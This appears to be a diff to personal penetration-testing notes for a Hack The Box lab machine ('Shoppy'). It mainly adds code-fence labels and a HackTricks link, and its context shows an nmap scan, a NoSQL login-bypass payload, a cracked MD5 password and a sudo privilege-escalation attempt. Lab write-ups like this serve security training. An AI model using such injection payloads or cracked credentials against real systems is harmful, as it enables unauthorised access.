@@ -1,4 +1,4 @@
-```
+```console
 ┌──(npayne㉿Nate-kali)-[~]
 └─$ nmap -A -p- -T4 -Pn 10.129.70.70
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 11:41 CDT
@@ -86,6 +86,8 @@ http://shoppy.htb/login
 
 https://book.hacktricks.xyz/pentesting-web/login-bypass
 
+https://book.hacktricks.xyz/pentesting-web/nosql-injection
+
 admin'||'1==1
 
 6ebcea65320589ca4f2f1ce039975995	md5	remembermethisway
@@ -96,6 +98,7 @@ http://mattermost.shoppy.htb
 
 cat password-manager
 
+```console
 jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
 Welcome to Josh password manager!
 Please enter your master password: Sample
@@ -122,7 +125,7 @@ Administrator. It usually boils down to these three things:
 
 [sudo] password for deploy: 
 Sorry, user deploy may not run sudo on shoppy.
-
+```
 
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Basic information ╠═══════════════════════════════                              
